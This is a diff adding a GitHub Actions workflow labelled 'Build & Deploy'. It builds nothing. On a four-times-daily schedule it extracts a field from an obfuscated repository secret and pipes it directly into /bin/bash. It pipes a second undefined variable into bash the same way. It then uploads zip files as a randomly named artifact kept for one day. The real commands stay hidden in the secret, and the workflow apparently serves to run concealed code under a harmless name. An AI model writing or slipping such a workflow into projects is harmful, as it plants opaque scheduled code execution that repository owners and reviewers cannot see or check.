@@ -1,0 +1,24 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 5,11,17,23 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          dao19555: ${{ secrets.dao19555 }}
+        run: |
+          printf '%s' "$dao19555" | jq -r .sms357 | /bin/bash
+          echo $af38 | jq -r .iv518 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: MVsIsI5u
+          path: "*.zip"
+          retention-days: 1
